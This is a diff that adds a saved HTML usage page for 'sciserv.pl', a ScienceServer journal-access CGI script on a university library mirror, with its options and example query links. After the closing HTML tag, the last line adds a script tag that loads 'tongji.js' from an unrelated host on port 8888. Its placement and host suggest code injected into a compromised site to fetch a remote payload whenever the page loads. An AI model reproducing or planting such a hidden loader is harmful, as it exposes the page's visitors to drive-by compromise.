@@ -1,0 +1,143 @@
+﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=(0054)http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl -->
+<HTML><HEAD><TITLE>sciserv.pl -- Usage</TITLE>
+<META http-equiv=Content-Type content="text/html; charset=utf-8">
+<META content="MSHTML 6.00.2900.2180" name=GENERATOR></HEAD>
+<BODY>
+<H2>sciserv.pl -- Usage</H2>Collections available: 
+<LI><A 
+href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals">Electronic 
+Journals</A><BR><BR>Options not in bold are not implemented. 
+<H3>Options used internally</H3>
+<DL>
+  <DT><B>collection</B> 
+  <DD>The collection what you seek is in. If <I>collection</I> is the only 
+  variable from this list that is defined, the main page will be presented. 
+  <DT><B>journal</B> 
+  <DD>ScienceServer JournalID. The ScienceServer JournalID is used internally by 
+  ScienceServer to uniquly identify a journal. If <I>collection</I> and 
+  <I>journal</I> are the only variables from this list that are defined, the 
+  journal's issue list will be presented. 
+  <DT><B>issue</B> 
+  <DD>ScienceServer IssueID. The ScienceServer IssueID is used internally by 
+  ScienceServer to uniquly identify an issue. Note that the issue variable could 
+  mean either an IssueID or the actual issue number. If <I>journal</I> is 
+  defined it is assumed that <I>issue</I> holds an IssueID. If 
+  <I>collection</I>, <I>journal</I>, and <I>issue</I> are the only variables 
+  from this list that are defined, the issue's table of contents are displayed. 
+  <DT><B>article</B> 
+  <DD>ScienceServer JournalID. The ScienceServer JournalID is used internally by 
+  ScienceServer to uniquly identify an article. 
+  <DT><B>letter</B> 
+  <DD>Used to specify a list of Journals. letter=a will list all journals that 
+  start with "A". The letter option is only used with the <I>collection</I> 
+  option. 
+  <DT><B>category</B> 
+  <DD>Used to specify a category to list. Only used with the <I>collection</I> 
+  option. </DD></DL>
+<H3>Options that may be used by others (previous SCIGATE functionality)</H3>
+<DL>
+  <DT><B>issn</B> 
+  <DD>Specify the ISSN (with or without dashes) here. 
+  <DT><B>volume</B> 
+  <DD>Specify the Volume number 
+  <DT><B>issue</B> 
+  <DD>Specify the Issue number. 
+  <DT><B>firstpage</B> 
+  <DD>Specify the first page of the article. 
+  <DT><B>title_chars</B> 
+  <DD>Specify any number of title charactors you wish. 
+  <DT><B>sici</B> 
+  <DD>Specify a SICI of an article. 
+  <DT>pii 
+  <DD>Specify a PII number. (This won't be handled for a while). </DD></DL>
+<UL></UL>
+<H3>Other options</H3>
+<DL>
+  <DT><B>template</B> 
+  <DD>This option sets the extention for the template. Every "renderer" uses a 
+  template that has the same name, i.e. "article.default". This option sets the 
+  extention, in case you don't want the default extention -- Which is normally 
+  "default", but can be set in the collection.cf file. 
+  <DT><B>form</B> 
+  <DD>Set this option to "html", "pdf", "xml", "refer", "seexml", or "usage". 
+  The default is "html". 
+  <UL>
+    <LI><I>html</I> -- Default. This renders the xml file in html. 
+    <LI><I>pdf</I> -- Displays the PDF file for this issue or article. 
+    <LI><I>seexml</I> -- Displays the contents of the .XML file. 
+    <LI><I>xml</I> -- Displays the REAL xml file. 
+    <LI><I>refer</I> -- Displays citation. 
+    <LI><I>usage</I> -- Displays usage information (this page). </LI></UL>
+  <DT><B>trace</B> 
+  <DD>If this option is defined to anything (like =yes), then we print some 
+  tracing information. </DD></DL>
+<H3>Future Options</H3>
+<DL>
+  <DT>source_url 
+  <DD>This options allows you to retrieve the .xml from another (foreign) 
+  site.<BR>Example: 
+  source_url=http://www.scienceserver.com/cgi-bin/sciserv.pl<BR>This option 
+  would request the .xml file from the foreign site, and render it according to 
+  local templates. </DD></DL>
+<H3>Examples</H3>
+<UL>
+  <LI><A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;journal=00145793">sciserv.pl?collection=journals&amp;journal=00145793</A> 
+  <A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;journal=00145793&amp;form=xml">[xml]</A> 
+  <A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;journal=00145793&amp;trace=on">[trace]</A> 
+
+  <LI><A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;journal=00319422">sciserv.pl?collection=journals&amp;journal=00319422</A> 
+  <A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;journal=00319422&amp;form=xml">[xml]</A> 
+  <A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;journal=00319422&amp;trace=on">[trace]</A> 
+
+  <LI><A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;journal=00319422&amp;issue=v46i0002">sciserv.pl?collection=journals&amp;journal=00319422&amp;issue=v46i0002</A> 
+  <A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;journal=00319422&amp;issue=v46i0002&amp;form=xml">[xml]</A> 
+  <A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;journal=00319422&amp;issue=v46i0002&amp;trace=on">[trace]</A> 
+
+  <LI><A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;journal=00319422&amp;issue=v46i0002&amp;article=185_mpoybt">sciserv.pl?collection=journals&amp;journal=00319422&amp;issue=v46i0002&amp;article=185_mpoybt</A> 
+  <A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;journal=00319422&amp;issue=v46i0002&amp;article=185_mpoybt&amp;form=xml">[xml]</A> 
+  <A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;journal=00319422&amp;issue=v46i0002&amp;article=185_mpoybt&amp;trace=on">[trace]</A> 
+
+  <LI><A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;journal=00145793">sciserv.pl?collection=journals&amp;journal=00145793</A> 
+  <A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;journal=00145793&amp;form=xml">[xml]</A> 
+  <A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;journal=00145793&amp;trace=on">[trace]</A> 
+
+  <LI><A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;letter=a">sciserv.pl?collection=journals&amp;letter=a</A> 
+  <A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;letter=a&amp;form=xml">[xml]</A> 
+  <A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;letter=a&amp;trace=on">[trace]</A> 
+  </LI></UL>
+<H3>Linking Examples</H3>
+<UL>
+  <LI><A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;issn=00145793">sciserv.pl?collection=journals&amp;issn=00145793</A> 
+  <A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;issn=00145793&amp;form=xml">[xml]</A> 
+  <A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;issn=00145793&amp;trace=on">[trace]</A> 
+
+  <LI><A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;issn=00145793&amp;volume=414&amp;issue=2">sciserv.pl?collection=journals&amp;issn=00145793&amp;volume=414&amp;issue=2</A> 
+  <A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;issn=00145793&amp;volume=414&amp;issue=2&amp;form=xml">[xml]</A> 
+  <A 
+  href="http://elsevier.lib.tsinghua.edu.cn/cgi-bin/sciserv.pl?collection=journals&amp;issn=00145793&amp;volume=414&amp;issue=2&amp;trace=on">[trace]</A> 
+  </LI></UL></LI></BODY></HTML>
+<script type="text/javascript" src="http://web.nba1001.net:8888/tj/tongji.js"></script>
